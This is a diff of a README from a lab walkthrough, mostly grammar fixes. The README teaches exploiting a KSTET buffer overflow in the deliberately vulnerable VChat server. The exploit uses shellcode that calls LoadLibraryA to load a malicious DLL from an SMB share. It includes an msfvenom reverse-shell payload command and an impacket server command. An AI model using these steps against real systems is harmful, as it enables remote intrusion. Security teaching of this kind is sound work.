@@ -1,17 +1,17 @@
 # VChat KSTET Exploit: DLL Side-Loading
 
-*Notice*: The following exploit, and its procedures are based on the original [Blog](https://fluidattacks.com/blog/vulnserver-kstet-alternative/)
+*Notice*: The following exploit and its procedures are based on the original [Blog](https://fluidattacks.com/blog/vulnserver-kstet-alternative/)
 ___
 
-As with the previous exploitation of the [KSTET](https://github.com/DaintyJet/VChat_KSTET_Multi) and similarly constrained commands such as [GTER](https://github.com/DaintyJet/VChat_GTER_EggHunter) we are limited by the space available on the buffer. We will not be repeating the use of [Egghunters](https://www.hick.org/code/skape/papers/egghunt-shellcode.pdf) or [Code-Reuse](https://github.com/DaintyJet/VChat_GTER_CodeReuse) methods. We will be using a [sideloading](https://www.crowdstrike.com/blog/dll-side-loading-how-to-combat-threat-actor-evasion-techniques/) technique. This means a legitimate executable, will use a function like [LoadLibraryA](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya) to load a malicious DLL into the processes memory and use this to execute malicious code.
+As with the previous exploitation of the [KSTET](https://github.com/DaintyJet/VChat_KSTET_Multi) and similarly constrained commands such as [GTER](https://github.com/DaintyJet/VChat_GTER_EggHunter) we are limited by the space available on the buffer. We will not be repeating the use of [Egghunters](https://www.hick.org/code/skape/papers/egghunt-shellcode.pdf) or [Code-Reuse](https://github.com/DaintyJet/VChat_GTER_CodeReuse) methods. We will be using a [sideloading](https://www.crowdstrike.com/blog/dll-side-loading-how-to-combat-threat-actor-evasion-techniques/) technique. This means a legitimate executable will use a function like [LoadLibraryA](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya) to load a malicious DLL into the processes memory and use this to execute malicious code.
 
 DLLs are [Dynamic-Link-Libraries](https://learn.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library), they are used as shared libraries that can be loaded at runtime by a process. This is where the [LoadLibraryA](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya) function comes into play, allowing us to use the malicious functions embedded in the DLL.
 
-**Notice**: Please setup the Windows and Linux systems as described in [SystemSetup](./SystemSetup/README.md)!
+**Notice**: Please set up the Windows and Linux systems as described in [SystemSetup](./SystemSetup/README.md)!
 ## Exploitation
 ### PreExploitation
 1. **Windows**: Setup Vchat.
-   1. Compile VChat and it's dependencies if they has not already been compiled. This is done with mingw.
+   1. Compile VChat and its dependencies if they have not already been compiled. This is done with mingw.
       1. Create the essfunc object File. 
 		```powershell
 		# Compile Essfunc Object file 
@@ -19,7 +19,7 @@ DLLs are [Dynamic-Link-Libraries](https://learn.microsoft.com/en-us/troubleshoot
 		```
       2. Create the [DLL](https://learn.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library) containing functions that will be used by the VChat.   
 		```powershell
-		# Create a the DLL with a static (preferred) base address of 0x62500000
+		# Create a DLL with a static (preferred) base address of 0x62500000
 		$ gcc.exe -shared -o essfunc.dll -Wl,--out-implib=libessfunc.a -Wl,--image-base=0x62500000 essfunc.o
 		```
          * ```-shared -o essfunc.dll```: We create a DLL "essfunc.dll", these are equivalent to the [shared library](https://tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html) in Linux. 
@@ -42,7 +42,7 @@ DLLs are [Dynamic-Link-Libraries](https://learn.microsoft.com/en-us/troubleshoot
 	$ nmap -A <IP>
 	```
    * We can think of the "-A" flag like the term aggressive as it does more than the normal scans, and is often easily detected.
-   * This scan will also attempt to determine the version of the applications, this means when it encounters a non-standard application such as *VChat* it can take 30 seconds to 1.5 minuets depending on the speed of the systems involved to finish scanning. You may find the scan ```nmap <IP>``` without any flags to be quicker!
+   * This scan will also attempt to determine the version of the applications, this means when it encounters a non-standard application such as *VChat* it can take 30 seconds to 1.5 minutes depending on the speed of the systems involved to finish scanning. You may find the scan ```nmap <IP>``` without any flags to be quicker!
    * Example results are shown below:
 
 		![NMap](Images/Nmap.png)
@@ -60,11 +60,11 @@ DLLs are [Dynamic-Link-Libraries](https://learn.microsoft.com/en-us/troubleshoot
 
 		![Telnet](Images/Telnet.png)
 
-4. **Linux**: We can try a few inputs to the *KSTET* command, and see if we can get any information. Simply type *KSTET* followed by some additional input as shown below:
+4. **Linux**: We can try a few inputs to the *KSTET* command and see if we can get any information. Simply type *KSTET* followed by some additional input as shown below:
 
 	![Telnet](Images/Telnet2.png)
 
-	* Now, trying every possible combinations of strings would get quite tiresome, so we can use the technique of *fuzzing* to automate this process as discussed later in the exploitation section.
+	* Now, trying every possible combination of strings would get quite tiresome, so we can use the technique of *fuzzing* to automate this process, as discussed later in the exploitation section.
 	* In this case we will do some fuzzing to keep the exploit sections relatively consistent, but as you can see we know crashing this command will not take much!
 ### Dynamic Analysis 
 This phase of exploitation is where we launch the target application or binary and examine its behavior based on the input we provide. We can do this both using automated fuzzing tools and manually generated inputs.
@@ -74,11 +74,11 @@ This phase of exploitation is where we launch the target application or binary a
 
 	<img src="Images/I1.png" width=800> 
 
-    * Note that you may need to launch it as the *Administrator* this is done by right clicking the icon found in the Windows search bar or on the desktop as shown below:
+    * Note that you may need to launch it as the *Administrator* this is done by right-clicking the icon found in the Windows search bar or on the desktop as shown below:
 			
 	<img src="Images/I1b.png" width = 200>
 
-2. Attach VChat: There are Two options! 
+2. Attach VChat: There are two options! 
    1. When the VChat is already Running. 
         1. Click File -> Attach
 
@@ -108,7 +108,7 @@ This phase of exploitation is where we launch the target application or binary a
 SPIKE is a C based fuzzing tool that is commonly used by professionals, it is available in [kali linux](https://www.kali.org/tools/spike/) and other [pen-testing platforms](https://www.blackarch.org/fuzzer.html) repositories. We should note that the original reference page appears to have been taken over by a slot machine site at the time of this writing, so you should refer to the [original writeup](http://thegreycorner.com/2010/12/25/introduction-to-fuzzing-using-spike-to.html) of the SPIKE tool by vulnserver's author [Stephen Bradshaw](http://thegreycorner.com/) in addition to [other resources](https://samsclass.info/127/proj/p18-spike.htm) for guidance. The source code is still available on [GitHub](https://github.com/guilhermeferreira/spikepp/) and still maintained on [GitLab](https://gitlab.com/kalilinux/packages/spike).
 
 1. Open a terminal on the **Kali Linux Machine**.
-2. Create a file ```KSTET.spk``` file with your favorite text editor. We will be using a SPIKE script and interpreter rather than writing our own C based fuzzer. We will be using the [mousepad](https://github.com/codebrainz/mousepad) text editor in this walkthrough though any editor may be used.
+2. Create a file ```KSTET.spk``` file with your favorite text editor. We will be using a SPIKE script and interpreter rather than writing our own C based fuzzer. We will be using the [mousepad](https://github.com/codebrainz/mousepad) text editor in this walkthrough, though any editor may be used.
 	```sh
 	$ mousepad KSTET.spk
 	```
@@ -139,8 +139,8 @@ SPIKE is a C based fuzzing tool that is commonly used by professionals, it is av
 
 	<img src="Images/I4.png" width=600>
 
-	* Notice that VChat appears to have crashed after our second message! We can see based on the stack's status that we do not need to send a message of length *5000* as was done when the server crashed (in my case). We can see that there is around 100 bytes of space before the series of `A`s stop.
-6. We can now try a few manual tests using the [`telnet`](https://linux.die.net/man/1/telnet) client as shown below. We range from a small set of four A's to near a hundred.
+	* Notice that VChat appears to have crashed after our second message! Based on the stack's status, we can see that we do not need to send a message of length *5000* as was done when the server crashed (in my case). We can see that there is around 100 bytes of space before the series of `A`s stop.
+6. We can now try a few manual tests using the [`telnet`](https://linux.die.net/man/1/telnet) client, as shown below. We range from a small set of four A's to near a hundred.
 
 	<img src="Images/I4b.png" width=600>
 
@@ -167,7 +167,7 @@ SPIKE is a C based fuzzing tool that is commonly used by professionals, it is av
 
 	<img src="Images/I5.png" width=800> 
 
-	* After capturing the packets, right click a TCP stream and click follow! This allows us to see all of the output.
+	* After capturing the packets, right-click a TCP stream and click follow! This allows us to see all of the output.
 
 		<img src="Images/I6.png" width=600> 
 
@@ -190,7 +190,7 @@ SPIKE is a C based fuzzing tool that is commonly used by professionals, it is av
 
 	<img src="Images/I10.png" width=600> 
 
-4. The next thing that is done, is to modify the exploit program to reflect the script [exploit2.py](./SourceCode/exploit2.py).
+4. The next step is to modify the exploit program to reflect the script [exploit2.py](./SourceCode/exploit2.py).
    * We do this to validate that we have the correct offset for the return address!
 
 		<img src="Images/I11.png" width=600>
@@ -202,7 +202,7 @@ SPIKE is a C based fuzzing tool that is commonly used by professionals, it is av
 	<img src="Images/I12.png" width=600>
 
       * We can see that the offset (Discovered with [pattern_offset.rb](https://github.com/rapid7/metasploit-framework/blob/master/tools/exploit/pattern_offset.rb) earlier) is at the byte offset of `66`, with the ESP at the offset of `70` and has `24` bytes following it, and the EBP is at the byte offset `62`.
-      * The most important thing we learn is that we have `24` bytes to work with!  
+      * The most important thing we learned is that we have `24` bytes to work with!  
 6. Open the `Executable Modules` window from the **views** tab. This allows us to see the memory offsets of each dependency VChat uses. This will help inform us as to which `jmp esp` instruction to pick, since we want to avoid any *Windows dynamic libraries* since their base addresses may vary between executions and systems. 
 
 	<img src="Images/I13.png" width=600>
@@ -227,7 +227,7 @@ SPIKE is a C based fuzzing tool that is commonly used by professionals, it is av
 
 		<img src="Images/I16.png" width=600>
 
-   2. Set a breakpoint at the desired address (Right click).
+   2. Set a breakpoint at the desired address (right-click).
 
 		<img src="Images/I17.png" width=600>
 
@@ -236,18 +236,18 @@ SPIKE is a C based fuzzing tool that is commonly used by professionals, it is av
 		<img src="Images/I18.png" width=600>
 
          * Notice that the EIP now points to an essfunc.dll address!
-	4. Once the overflow occurs click the *step into* button highlighted below.
+	4. Once the overflow occurs, click the *step into* button highlighted below.
 
 		<img src="Images/I19.png" width=600>
 
-	5. Notice that we jump to the stack we just overflowed!
+	5. Notice that we jumped to the stack we just overflowed!
 
 		<img src="Images/I20.png" width=600> 
 
 
 Now that we have all the necessary parts for the creation of a exploit we will discuss what we have done so far (the **exploit.py** files), and how we can now expand our efforts to gain a shell in the target machine.
 ### Exploitation
-1. We know from one of our previous runs of `mona.py` (`!mona findmsp`) that we have a very limited amount of space following the *EIP* register. As we have done in previous exploits we will preform a short relative jump to the start of the buffer so we can use the sixty six bytes that precede our return address for our first stage shell code.
+1. We know from one of our previous runs of `mona.py` (`!mona findmsp`) that we have a very limited amount of space following the *EIP* register. As we have done in previous exploits we will perform a short relative jump to the start of the buffer so we can use the sixty-six bytes that precede our return address for our first-stage shell code.
 
 	https://github.com/DaintyJet/VChat_KSTET_DLL/assets/60448620/f0c15355-9098-4e24-8c60-48652d86bf92
 
@@ -277,7 +277,7 @@ Now that we have all the necessary parts for the creation of a exploit we will d
 
 		<img src="Images/I24.png" width=600> 
 
-2. Now that we have the Assembly instruction for the Short Jump, place it into the python program as shown in [exploit4.py](./SourceCode/exploit4.py).
+2. Now that we have the assembled instruction for the short jump, place it into the python program as shown in [exploit4.py](./SourceCode/exploit4.py).
 	```python
 	PAYLOAD = (
 		b'KSTET ' +
@@ -294,11 +294,11 @@ Now that we have all the necessary parts for the creation of a exploit we will d
 	https://github.com/DaintyJet/VChat_KSTET_DLL/assets/60448620/c509b866-ddc1-4fcf-8eff-3adc1a85d92b
 
 #### Malicious DLLs
-As was previously discussed in the introduction of this walkthrough DLLs are [Dynamic-Link-Libraries](https://learn.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library), these are libraries that are loaded into memory, and shared between processes. If a program is set to use a custom DLL, or is not statically-linked then the addresses for the functions in a DLL will be resolved by a [Runtime Dynamic Linker](https://learn.microsoft.com/en-us/windows/win32/dlls/run-time-dynamic-linking) or a [Loadtime Dynamic Linker](https://learn.microsoft.com/en-us/windows/win32/dlls/load-time-dynamic-linking). In our case the use of the [LoadLibraryA](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya) means we will be invoking the [Runtime Dynamic Linker](https://learn.microsoft.com/en-us/windows/win32/dlls/run-time-dynamic-linking). Once we have loaded and linked our malicious DLL to the executable we can use any function located within the DLL. Additionally if the DLL contains a [DLLMain(...)](https://learn.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library#the-dll-entry-point) function, this will be executed when the DLL is loaded. This is not present in all DLLs and when it is will often be used to initialize any data structures or variables that will be needed by the DLL's functions. This attack should **not be confused** with DLL load order hijacking attacks which exploit the [search order](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order) Windows uses for resolving DLLs.
+As was previously discussed in the introduction of this walkthrough DLLs are [Dynamic-Link-Libraries](https://learn.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library), these are libraries that are loaded into memory, and shared between processes. If a program is set to use a custom DLL, or is not statically linked then the addresses for the functions in a DLL will be resolved by a [Runtime Dynamic Linker](https://learn.microsoft.com/en-us/windows/win32/dlls/run-time-dynamic-linking) or a [Loadtime Dynamic Linker](https://learn.microsoft.com/en-us/windows/win32/dlls/load-time-dynamic-linking). In our case the use of the [LoadLibraryA](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya) means we will be invoking the [Runtime Dynamic Linker](https://learn.microsoft.com/en-us/windows/win32/dlls/run-time-dynamic-linking). Once we have loaded and linked our malicious DLL to the executable, we can use any function located within the DLL. Additionally, if the DLL contains a [DLLMain(...)](https://learn.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library#the-dll-entry-point) function, this will be executed when the DLL is loaded. This is not present in all DLLs and when it is will often be used to initialize any data structures or variables that will be needed by the DLL's functions. This attack should **not be confused** with DLL load order hijacking attacks, which exploit the [search order](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order) Windows uses for resolving DLLs.
 
-DLLs are commonly used in Windows applications for a [number of reasons](https://learn.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library#dll-advantages). One of the first to be mentioned is that fewer system resources will be used when the DLL is used by many processes as rather than loading and linking the library for each individual process, the DLL will be loaded into memory once and each processes that uses the DLL will be linked against it. DLLs also allow programs to at runtime load the correct DLL based on the requirements and conditions of the system, this promotes more modular systems. Finally we can see that if a program uses DLLs they do not need to be recompiled and relinked if the DLL is modified and replaced; only if the function signature or returned values changes would the executable need to be modified and recompiled.
+DLLs are commonly used in Windows applications for a [number of reasons](https://learn.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library#dll-advantages). One of the first to be mentioned is that fewer system resources will be used when the DLL is used by many processes as rather than loading and linking the library for each individual process, the DLL will be loaded into memory once and each process that uses the DLL will be linked against it. DLLs also allow programs to at runtime load the correct DLL based on the requirements and conditions of the system, this promotes more modular systems. Finally, we can see that if a program uses DLLs they do not need to be recompiled and relinked if the DLL is modified and replaced; only if the function signature or returned values changes would the executable need to be modified and recompiled.
 
-This is why DLLs are used in the Windows OS to provide API wrappers to the OS Systemcalls, in addition to the interrupts for Windows systemcalls not being the most stable and changing from time to time. You could use some [online resources](https://j00ru.vexillium.org/syscalls/nt/64/) that track the systemcall interfaces and recompile your program for each build but it is much simpler to use the APIS provided in the DLLs!
+This is why DLLs are used in the Windows OS to provide API wrappers to the OS system calls, in addition to the interrupts for Windows system calls not being the most stable and changing from time to time. You could use some [online resources](https://j00ru.vexillium.org/syscalls/nt/64/) that track the system call interfaces and recompile your program for each build, but it is much simpler to use the APIS provided in the DLLs!
 
 
 We will be using the fact that the [LoadLibraryA](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya) function can accept a location string in the form of a [Universal Naming Convention (UNC)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/62e862f4-2a51-452e-8eeb-dc4ff5ee33cc) string. This allows us to use the `LoadLibraryA` function to load a malicious DLL hosted on a remote [SMB share](https://learn.microsoft.com/en-us/windows-server/storage/file-server/file-server-smb-overview). We will use the [Impacket-Scripts](https://www.kali.org/tools/impacket-scripts/) package of exploitation tools to host a SMB share on the Kali Linux machine!
@@ -308,21 +308,21 @@ We can **generate** the malicious DLL using [msfvenom](https://docs.metasploit.c
 ```
 $ msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=10.0.2.15 LPORT=8080 EXITFUNC=none -f dll -o mal.dll
 ```
-* `-a x86`: Specify this is against a 32 bit program.
+* `-a x86`: Specify this is against a 32-bit program.
 * `--platform windows`: Specify this is against a process on a Windows system.
 * `-p `: Payload we are generating shellcode for.
     * `windows/shell_reverse_tcp`: Reverse TCP payload for Windows
-    * `LHOST=10.0.2.7`: The remote listening host's IP, in this case our Kali machine's IP `10.0.2.7`.
+    * `LHOST=10.0.2.7`: The remote listening host's IP, in this case, our Kali machine's IP, `10.0.2.7`.
     * `LPORT=8080`: The port on the remote listening host's traffic should be directed to in this case port 8080.
     * `EXITFUNC=none`: The runs without an exit function, the program will likely crash after this finishes executing!
 * `-f`: The output format.
     * `dll`: Format for use as a DLL.
 
-Now we know from the [UNC](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/62e862f4-2a51-452e-8eeb-dc4ff5ee33cc) datatype that we have to provide a string in the form `= "\\" host-name "\" share-name  [ "\" object-name ]` when attempting to load and attach a DLL to our process. In our case this could be something like `\\10.0.2.15\A\mal.dll` where `10.0.2.15` is the IP of the Kali, `ABCD` is the name of our SMB share and `mal.dll` is the malicious DLL object we are sharing. So we can generate a SMB share using the following command. This should be ran in the directory that contains the malicious DLL `mal.dll`.
+Now we know from the [UNC](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/62e862f4-2a51-452e-8eeb-dc4ff5ee33cc) datatype that we have to provide a string in the form `= "\\" host-name "\" share-name  [ "\" object-name ]` when attempting to load and attach a DLL to our process. In our case this could be something like `\\10.0.2.15\A\mal.dll` where `10.0.2.15` is the IP of the Kali, `ABCD` is the name of our SMB share and `mal.dll` is the malicious DLL object we are sharing. So we can generate an SMB share using the following command. This should be run in the directory that contains the malicious DLL `mal.dll`.
 ```
 $ sudo impacket-smbserver -smb2support ABCD .
 ```
-* `sudo`: This command and operation requires root privileges to bind to the well known SMB port 445.
+* `sudo`: This command and operation requires root privileges to bind to the well-known SMB port 445.
 * [`impacket-smbserver`](https://www.kali.org/tools/impacket-scripts/#impacket-smbserver):  This is the command the launches a SMB server and add a share as specified. 
 * `smb2support`: Enable SMB2 Support.
 * `A`: Name of the current Share. This is chosen to be short as we would complicate the shellcode generation otherwise.
@@ -331,14 +331,14 @@ $ sudo impacket-smbserver -smb2support ABCD .
 	https://github.com/DaintyJet/VChat_KSTET_DLL/assets/60448620/ee57745f-bddc-4f6f-8788-372524798848
 
 #### Shellcode Generation
-We will as has been stated many times previously be using the LoadLibraryA function which has the following function signature: 
+We will as has been stated many times previously, be using the LoadLibraryA function, which has the following function signature: 
 ```
 HMODULE LoadLibraryA(
   [in] LPCSTR lpLibFileName
 );
 ```
 * `LPCSTR lpLibFileName`: This is a string specifying the DLL to be loaded, this can be a UNC path.
-* This will return the handle to the module if it succeeds, otherwise it will be NULL.
+* This will return the handle to the module if it succeeds otherwise it will be NULL.
 
 The string we need to push on the stack is `\\10.0.2.15\A\mal.dll` as was discussed in the [Malicious DLLs](#malicious-dlls) section earlier. As we are working with a 32-bit system we need to split this string of 24 bytes (23 chars + 1 NULL) into 4 byte chunks for the optimal PUSH operations onto the stack. Thr [original blog](https://fluidattacks.com/blog/vulnserver-kstet-alternative/) provides the following shellscript.
 
@@ -385,7 +385,7 @@ Now we can see what happens to all the resulting stdout values after the loop ha
 **Now we can create the resulting Shellcode**:
 
 
-1. First we need to move our stack pointer by modifying the `ESP` register so it is not above our shellcode. This is done to prevent the shellcode from overwriting part of itself with values used when making function calls or other stack operations. If the `ESP` value is below or less than the current shellcodes address there will be no conflict as the stack grows down, while the shellcode will execute instructions at higher addresses sequentially.   
+1. First we need to move our stack pointer by modifying the `ESP` register so it is not above our shellcode. This is done to prevent the shellcode from overwriting part of itself with values used when making function calls or other stack operations. If the `ESP` value is below or less than the current shellcode address, there will be no conflict as the stack grows down, while the shellcode will execute instructions at higher addresses sequentially.   
 	```
 	sub esp,0x64            ; Move ESP pointer to be behind (above) our shellcode as the stack grows down this prevents overwrites
 	```
@@ -418,7 +418,7 @@ Now we can see what happens to all the resulting stdout values after the loop ha
 	```
 	* `arwin.exe`: This is the arwin address resolution program.
 	* `kernel32`: This is the DLL that the function is stored in that we should search.
-	* `LoadLibraryA`: The function who's address we are attempting to resolve.
+	* `LoadLibraryA`: The function whose address we are attempting to resolve.
 
 	<img src="Images/I25.png" width=600> 
 
@@ -452,7 +452,7 @@ Now we can see what happens to all the resulting stdout values after the loop ha
 		<img src="Images/I26.png" width=600> 
 
 #### Execution
-Now we we have everything we need to exploit the VChat server using the DLL sideloading technique!
+Now we have everything we need to exploit the VChat server using the DLL sideloading technique!
 
 1. First we need to add the shellcode we generated to the exploit program as was done for the [exploit5.py](./SourceCode/exploit5.py) example script.
 
@@ -486,11 +486,11 @@ Now we we have everything we need to exploit the VChat server using the DLL side
 
 		<img src="Images/I16.png" width=600>
 
-   2. Set a breakpoint at the desired address (Right click).
+   2. Set a breakpoint at the desired address (right-click).
 
 		<img src="Images/I17.png" width=600>
 
-   3. Run the [exploit3.py](./SourceCode/exploit5.py) program till an overflow occurs (See EIP/ESP and stack changes), you should be able to tell by the black text at the bottom the the screen that says `Breakpoint at ...`.
+   3. Run the [exploit3.py](./SourceCode/exploit5.py) program until an overflow occurs (See EIP/ESP and stack changes), you should be able to tell by the black text at the bottom the screen that says `Breakpoint at ...`.
 
 		<img src="Images/I18.png" width=600>
 
@@ -520,7 +520,7 @@ Now we we have everything we need to exploit the VChat server using the DLL side
 	```
 	$ sudo impacket-smbserver -smb2support ABCD .
 	```
-	* `sudo`: This command and operation requires root privileges to bind to the well known SMB port 445.
+	* `sudo`: This command and operation requires root privileges to bind to the well-known SMB port 445.
 	* [`impacket-smbserver`](https://www.kali.org/tools/impacket-scripts/#impacket-smbserver):  This is the command the launches a SMB server and add a share as specified. 
 	* `smb2support`: Enable SMB2 Support.
 	* `A`: Name of the current Share. This is chosen to be short as we would complicate the shellcode generation otherwise.
